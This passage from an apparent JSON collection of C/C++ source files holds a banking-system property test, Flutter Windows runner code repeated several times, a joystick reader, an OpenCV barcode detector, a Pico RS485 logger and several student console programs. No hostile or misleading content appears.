bankingSystem.createAccount(source_account_number, \"SourceOwner\", initial_balance);\r\n    bankingSystem.createAccount(dest_account_number, \"DestOwner\", initial_balance);\r\n    bankingSystem.transfer(source_account_number, dest_account_number, transfer_amount);\r\n\r\n    Account *source_account = bankingSystem.findAccount(source_account_number);\r\n    ASSERT(source_account == nullptr); // Source account should not exist due to invalid transfer\r\n}\r\n\r\nTEST(BankingSystemPropertyTest, AccountDeletion)\r\n{\r\n    BankingSystem bankingSystem;\r\n    int account_number = DeepState_IntInRange(1, MAX_ACCOUNTS);\r\n    double initial_balance = DeepState_DoubleInRange(1.0, 100.0);\r\n    bankingSystem.createAccount(account_number, \"TestOwner\", initial_balance);\r\n    bankingSystem.deleteAccount(account_number);\r\n\r\n    Account *account = bankingSystem.findAccount(account_number);\r\n    ASSERT(account == nullptr); // Account should not exist after deletion\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* Student Note:\r\n * I use underscore styled variables in my code.\r\n * All camelcase styled are only kept that way for the grader's convenience when using Ctrl+F.\r\n * \r\n * I ackowledge that it is best practice to be consistent when naming variables,\r\n * however I had written over half my program before I realized certain (provided) variables/parameters\r\n * were written in camelcase.\r\n * \r\n * Thank you for grading!\r\n */\r\n\r\n#include \"student.h\"\r\n#include \"roster.h\"\r\n#include \"degree.h\"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    cout\r\n        << \"C867 - SCRIPTING AND PROGRAMMING - APPLICATIONS\" << endl\r\n        << \"Programming Language: C++\" << endl\r\n        << \"WGU Student ID: #001264312\" << endl\r\n        << \"Name: Jonathan Lane\" << endl\r\n        << endl;\r\n\r\n    const string studentData[] =\r\n    {\r\n        \"A1,John,Smith,John1989@gm ail.com,20,30,35,40,SECURITY\",\r\n        \"A2,Suzan,Erickson,Erickson_1990@gmailcom,19,50,30,40,NETWORK\",\r\n        \"A3,Jack,Napoli,The_lawyer99yahoo.com,19,20,40,33,SOFTWARE\",\r\n        \"A4,Erin,Black,Erin.black@comcast.net,22,50,58,40,SECURITY\",\r\n        \"A5,Jonathan,Lane,lane.jonathan@outlook.com,19,10,10,10,SOFTWARE\"\r\n    };\r\n\r\n    Roster classRoster(studentData);\r\n\r\n    classRoster.printAll();\r\n    classRoster.printInvalidEmails();\r\n\r\n    for (int i{0}; i < classRoster.firstEmptySpot(); i++) {\r\n        Student* current_student{classRoster.classRosterArray[i]};\r\n        classRoster.printAverageDaysInCourse(current_student->getId());\r\n    }\r\n    cout << endl;\r\n\r\n    classRoster.printByDegreeProgram(DegreeProgram::SOFTWARE);\r\n    classRoster.remove(\"A3\");\r\n    classRoster.printAll();\r\n    classRoster.remove(\"A3\");\r\n\r\n    return 0;\r\n}\r\n",
    "// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//   http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// Copyright Drew Noakes 2013-2016\n\n#include \"joystick_linux.h\"\n\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <iostream>\n#include <string>\n#include <sstream>\n#include \"unistd.h\"\n\nJoystick::Joystick()\n{\n  openPath(\"/dev/input/js0\");\n}\n\nJoystick::Joystick(int joystickNumber)\n{\n  std::stringstream sstm;\n  sstm << \"/dev/input/js\" << joystickNumber;\n  openPath(sstm.str());\n}\n\nJoystick::Joystick(std::string devicePath)\n{\n  openPath(devicePath);\n}\n\nJoystick::Joystick(std::string devicePath, bool blocking)\n{\n  openPath(devicePath, blocking);\n}\n\nvoid Joystick::openPath(std::string devicePath, bool blocking)\n{\n  // Open the device using either blocking or non-blocking\n  _fd = open(devicePath.c_str(), blocking ? O_RDONLY : O_RDONLY | O_NONBLOCK);\n}\n\nbool Joystick::sample(JoystickEvent* event)\n{\n  int bytes = read(_fd, event, sizeof(*event));\n\n  if (bytes == -1)\n    return false;\n\n  // NOTE if this condition is not met, we're probably out of sync and this\n  // Joystick instance is likely unusable\n  return bytes == sizeof(*event);\n}\n\nbool Joystick::isFound()\n{\n  return _fd >= 0;\n}\n\nJoystick::~Joystick()\n{\n  close(_fd);\n}\n\nstd::ostream& operator<<(std::ostream& os, const JoystickEvent& e)\n{\n  os << \"type=\" << static_cast<int>(e.type)\n     << \" number=\" << static_cast<int>(e.number)\n     << \" value=\" << static_cast<int>(e.value);\n  return os;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Track_Detector.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n#include <iostream>\r\n#include <vector>\r\n#include <opencv2/opencv.hpp>\r\n#include <opencv2/core/core.hpp>\r\n#include <opencv2/highgui/highgui.hpp>\r\n#include <opencv2/imgproc.hpp>\r\n#include <string>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\nusing namespace cv;\r\nconst char* image_window = \"Source Image\";\r\n//const char* result_window = \"Result window\";\r\nint font_size = 1;\r\nScalar font_color(0, 0, 0);\r\nint font_weight = 2;\r\n\r\nvoid save(Mat image,string path) {\r\n    bool isSuccess = imwrite(path, image);\r\n    if (isSuccess == false) {\r\n        cout << \"Failed to save image\" << endl;\r\n        cin.get();\r\n    }\r\n    else {\r\n        cout << \"Image saved\" << endl;\r\n    }\r\n}\r\n\r\nint** TemplateMatching(Mat source, Mat templ, int objectNum) {\r\n    int** arr = new int* [objectNum];\r\n    Mat result;\r\n    double minVal;\r\n    double maxVal;\r\n    Point minLoc;\r\n    Point matchLoc;\r\n    Point maxLoc;\r\n    int j = 0;\r\n    for (int k = 0; k < objectNum; k++, j++) {\r\n        matchTemplate(source, templ, result, TM_SQDIFF_NORMED);\r\n        minMaxLoc(result, &minVal, &maxVal, &minLoc, &maxLoc, Mat());\r\n        matchLoc = minLoc;\r\n        arr[k] = new int[objectNum];\r\n        arr[k][0] = matchLoc.x;\r\n        arr[k][1] = matchLoc.y;\r\n        for (int i = 0; i < templ.cols; i++) {\r\n            for (int j = 0; j < templ.rows; j++) {\r\n                source.at<Vec2b>(matchLoc.y + j, (matchLoc.x + i) / 2) = 0;\r\n            }\r\n        }\r\n    }\r\n    return arr;\r\n}\r\n\r\nint Table(int binary) {\r\n    switch (binary) {\r\n    case(21100001):\r\n        return 1;\r\n        break;\r\n    case(21010010):\r\n        return 2;\r\n        break;\r\n    case(10110011):\r\n        return 3;\r\n        break;\r\n    case(20110100):\r\n        return 4;\r\n        break;\r\n    case(11010101):\r\n        return 5;\r\n        break;\r\n    case(11100110):\r\n        return 6;\r\n        break;\r\n    case(20000111):\r\n        return 7;\r\n        break;\r\n    case(11111000):\r\n        return 8;\r\n        break;\r\n    case(20011001):\r\n        return 9;\r\n        break;\r\n    case(20101010):\r\n        return 0;\r\n        break;\r\n    default:\r\n        return 0;\r\n        break;\r\n    }\r\n}\r\n\r\nvoid Barcode(Mat source, int x, int y, Mat templ) {\r\n    int barcode[80];\r\n    memset(barcode, 0, sizeof(barcode));\r\n    int textNum[10];\r\n    memset(textNum, 0, sizeof(textNum));\r\n    int adjust;\r\n    std::ostringstream oss;\r\n    for (int N = 0; N < 2; N++) {\r\n        int test = 0;\r\n        int index = 0;\r\n        int count = 0;\r\n        int width = 29;\r\n        int norm = 12;\r\n        int threshold = 100;\r\n        while (index != 100) {\r\n            test = int(source.at<Vec2b>(y + index, x / 2 + 66 - N * 44)[0]);\r\n            if (test < threshold - 10 && test > 50) {\r\n                count += 1;\r\n            } //makes sure its a barcode value and not random black dot\r\n            if (count > 2 && test > threshold - 20) {  //found barcode\r\n                for (int i = 0; i < 40; i++) {//barcode sections\r\n                    for (int n = 0; n < 29; n++) {//each section value\r\n                        barcode[i + N * 40] += source.at<Vec2b>(y + index - count / 2 - norm + i * 29 + n, x / 2 + 66 - N * 44)[0];\r\n                    }//total value of each section\r\n                    if (barcode[i + N * 40] / width > threshold) {\r\n                        barcode[i + N * 40] = 0;\r\n                    }\r\n                    else {\r\n                        barcode[i + N * 40] = 1;\r\n                    }\r\n                }\r\n                index = 100;\r\n            }\r\n            else {\r\n                index += 1;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < 10; i++) {\r\n        for (int j = 0; j < 8; j++) {\r\n            if (j == 0) {\r\n                adjust = 1;\r\n            }\r\n            else {\r\n                adjust = 0;\r\n            }\r\n            textNum[i] += (barcode[i * 8 + j] + adjust) * pow(10, 7 - j);\r\n        }\r\n        textNum[i] = Table(textNum[i]);\r\n    }\r\n    oss << \"Photo: \" << textNum[1] << textNum[2] << textNum[3] << textNum[4] << \"; Roll: \" << textNum[6] << textNum[7] << textNum[8] << textNum[9] << \"; Cam: \" << textNum[5] << \"; Expan: \" << textNum[0];\r\n    std::string var = oss.str();\r\n    Point text_position(source.cols / 2, y / 2);\r\n    putText(source, var, text_position, FONT_HERSHEY_COMPLEX, font_size, font_color, font_weight);\r\n}\r\n\r\nvoid find_track(Mat source,int x, int y) {\r\n    int j = 0;\r\n    int count = 0;\r\n    int test;\r\n    //rectangle(source, Point(500, 500), Point(600, 600), Scalar(0, 0, 255));\r\n    while (j == 0) {\r\n        test = int(source.at<Vec2b>(y + count, x)[0]);\r\n        cout << count << endl;\r\n        if (test < 90 && test > 50) {\r\n            rectangle(source,Point(y+count,x),Point(y + count + 100,x + 100),Scalar(0,255,255));\r\n            j = 1;\r\n        }\r\n        count += 1;\r\n        if (count > 1000) {\r\n            rectangle(source, Point(y + count, x), Point(y ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <stdio.h>\n#include \"pico/stdlib.h\"\n#include <hardware/gpio.h>\n#include <hardware/uart.h>\n#include \"crc.h\"\n\n#define RS485_RX_PIN  21\n#define RS485_TX_PIN  20\n\nvolatile bool ledState = true;\n\nint main() {\n    stdio_init_all();\n\n    gpio_init(PICO_DEFAULT_LED_PIN);\n    gpio_set_dir(PICO_DEFAULT_LED_PIN, GPIO_OUT);\n    gpio_put(PICO_DEFAULT_LED_PIN, 1);\n\n    uart_init(uart1, 38400);\n    gpio_set_function(RS485_RX_PIN, GPIO_FUNC_UART);\n    gpio_set_function(RS485_TX_PIN, GPIO_FUNC_UART);\n\n    \n\n    while (true) {\n        // Wait for a null bute\n        uint8_t byte;\n        do { uart_read_blocking(uart1, &byte, 1); }\n        while (byte);\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 0);\n        uint64_t timestamp = time_us_64();\n\n        // Read the destination\n        uint8_t dest;\n        uart_read_blocking(uart1, &dest, 1);\n\n        // Print header\n        uint32_t us = timestamp % 1000000;\n        uint32_t s = timestamp / (uint64_t)1000000;\n        uint32_t m = s / 60;\n        uint32_t h = m / 60;\n        printf(\"%c %02d:%02d:%02d.%06d \", (dest == 0x05)?'>':'<', h%24, m%60, s%60, us);\n        \n        // Read 0x7E\n        uart_read_blocking(uart1, &byte, 1);\n        //printf(\"7E \");\n\n        // Read data until next 0x7E\n        while (true) {\n            uart_read_blocking(uart1, &byte, 1);\n            if (byte == 0x7E) { break; }\n            printf(\"%02X\", byte);\n        }\n        //printf(\"7E \");\n        printf(\"\\n\");\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 1);\n    }\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Theater \r\n{\r\npublic:\r\n    void showdata() {\r\n        cout<<\"1. Display movies\"<<endl;\r\n        cout<<\"2. Display seat availability\"<<endl;\r\n        cout<<\"3. Book a ticket\"<<endl;\r\n        cout<<\"4. Cancel_ticket\"<<endl;\r\n        cout<<\"5. Exit\"<<endl;\r\n        cout<<endl;\r\n    }\r\n\r\n    void Display_movies() {\r\n        cout<<\"Available movies:\"<<endl;\r\n        cout<<\"0. Avengers (Action) - 150 min\"<<endl;\r\n        cout<<\"1. Jawan (Action thriller) - 120 min\"<<endl;\r\n        cout<<\"2. The Nun (Horror) - 145 min\"<<endl;\r\n        cout<< \"---------------------------\"<<endl;\r\n    }\r\n\r\n    void Display_seat_availability(char seats[7][7]) \r\n\t{\r\n        cout<<\"Seat availability:\"<<endl;\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                if(seats[i][j]=='O') \r\n\t\t\t\t{\r\n                    cout<<'O'<<\" \"; \r\n                } else \r\n\t\t\t\t{\r\n                    cout<<'X'<<\" \"; \r\n                }\r\n            }\r\n            cout<<endl;\r\n        }\r\n        cout<<\"-----------------------------\"<< endl;\r\n    }\r\n};\r\n\r\nclass Booking : public Theater \r\n{\r\npublic:\r\n    char seats[7][7]; \r\n\r\n    Booking() \r\n\t{\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                seats[i][j]='O';\r\n            }\r\n        }\r\n    }\r\n\r\n    void Book_ticket() \r\n\t{\r\n        Display_movies();\r\n\r\n        int movieIndex;\r\n        cout << \"Select movie index: \";\r\n        cin >> movieIndex;\r\n\r\n        if(movieIndex<0||movieIndex>2) \r\n\t\t{\r\n            cout<<\"Invalid movie index.\"<<endl;\r\n        }\r\n\r\n        Display_seat_availability(seats);\r\n\r\n        int row, column;\r\n        cout<<\"Choose row and column to select a seat for booking (1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='O') \r\n\t\t\t{\r\n                seats[row-1][column-1]='X';\r\n                cout<<\"Ticket booked successfully for movie index \"<< movieIndex<<\" and seat \"<<row<< \"-\"<< column << endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout<<\"Seat is already booked. Please select another seat.\"<<endl;\r\n            }\r\n        \r\n        cout<< \"-------------------\"<< endl;\r\n    \r\n    \t}\r\n\t}\r\n\tvoid Cancel_ticket() \r\n\t{\r\n        Display_seat_availability(seats);\r\n        int row,column;\r\n        cout<<\"Choose row and column to cancel a booked seat(1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='X') \r\n\t\t\t{\r\n                seats[row - 1][column - 1]='O';\r\n                cout<<\"Ticket canceled successfully for seat \"<<row<< \"-\"<<column<<endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout <<\"Seat is not booked. Please select a valid seat to cancel.\"<<endl;\r\n            }\r\n            cout<<\"-------------------\"<<endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid intro() \r\n{\r\n    cout<<\"WELCOME TO THEATER MANAGEMENT PROJECT\"<< endl;\r\n    cout<<\"Created by Vaishnavi and Pradnya\"<< endl;\r\n}\r\n\r\nint main() \r\n{\r\n    intro();\r\n    Booking b;\r\n    int choice;\r\n\r\n    while (true) \r\n\t{\r\n        b.showdata();\r\n        cout<<endl;\r\n        cout<<\"Enter your choice: \";\r\n        cin>>choice;\r\n\r\n        switch(choice) \r\n\t\t{\r\n            case 1:\r\n                b.Display_movies();\r\n                break;\r\n            case 2:\r\n                b.Display_seat_availability(b.seats);\r\n                break;\r\n            case 3:\r\n                b.Book_ticket();\r\n                break;\r\n            case 4:\r\n            \tb.Cancel_ticket();\r\n            case 5:\r\n                cout<<\"Exiting the program\"<< endl;\r\n                \r\n            default:\r\n                cout<<\"Invalid choice\"<< endl;\r\n\t\r\n        }\r\n        \r\n    }\r\n    return 1;\r\n}\r\n\r\n\r\n",
    "//PROJECT: Student Record Management System using C++\n//Written by Md Zakaullah\n#include<iostReam>\nusing namespace std;\nstring Roll_no[30],name[30],Class[30],course[30],mobile_no[30],admission_year[30];\nint total=0;\nvoid Enter()\n{\nint ch=0;\ncout<<\"How many students do u want to Enter??\"<<endl;\ncin>>ch;\nif(total==0)\n{\ntotal=ch+total;\nfor(int i=0;i<ch;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO:: \"<<endl;\ncin>>Roll_no[i];\ncout<<\"Enter Name: \"<<endl;\ncin>>name[i];\ncout<<\"Enter Class: \"<<endl;\ncin>>Class[i];\ncout<<\"Enter Course: \"<<endl;\ncin>>course[i];\ncout<<\"Enter Mobile NO: \"<<endl;\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \"<<endl;\ncin>>admission_year[i];\n}\n}\nelse\n{\nfor(int i=total;i<ch+total;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter Course: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\ntotal=ch+total;\n}\n}\nvoid show()\n{\nif(total==0)\n{\ncout<<\"No Data is Entered\"<<endl;\n}\nelse\n{\nfor(int i=0;i<total;i++)\n{\ncout<<\"\\nData of Student \"<<i+1<<endl<<endl;\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\nvoid search()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse\n{\nstring Rollno;\ncout<<\"Enter the Roll no of student\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\n}\nvoid update()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse{\nstring Rollno;\ncout<<\"Enter the Roll no of student which you want to update\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"\\nPrevious data\"<<endl<<endl;\ncout<<\"Data of Student \"<<i+1<<endl;\ncout<<\"Roll NO: \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"Course \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\ncout<<\"\\nEnter new data\"<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter CouRse: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\n}\n}\n}\nvoid Delete()\n{\nif(total==0)\n{\ncout<<\"No data is Entered yet\"<<endl;\n}\nelse\n{\nint a;\ncout<<\"Are you Sure to Delete Data?\"<<endl;\ncout<<\"Press 1 to delete all Record\"<<endl;\ncin>>a;\nif(a==1)\n{\ntotal=0;\ncout<<\"All Record is deleted..!!\"<<endl;\n}\nelse\n{\ncout<<\"Please Press 1 to Delete All Record\"<<endl;\n}\n}\n}\nint main() \n{\nint value;\nwhile(true)\n{\ncout<<\"\\nPress 1 to Enter data\"<<endl<<endl;\ncout<<\"PRess 2 to Show data\"<<endl<<endl;\ncout<<\"PRess 3 to Search data\"<<endl<<endl;\ncout<<\"Press 4 to Update data\"<<endl<<endl;\ncout<<\"Press 5 to Delete data\"<<endl<<endl;\ncout<<\"Press 6 to Quit\"<<endl<<endl;\ncin>>value;\nswitch(value)\n{\ncase 1:\nEnter();\nbreak;\ncase 2:\nshow();\nbreak;\ncase 3:\nsearch();\nbreak;\ncase 4:\nupdate();\nbreak;\ncase 5:\nDelete();\nbreak;\ncase 6:\nexit(0);\nbreak;\ndefault:\ncout<<\"Invalid input\"<<endl;\nbreak;\n}\n}\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
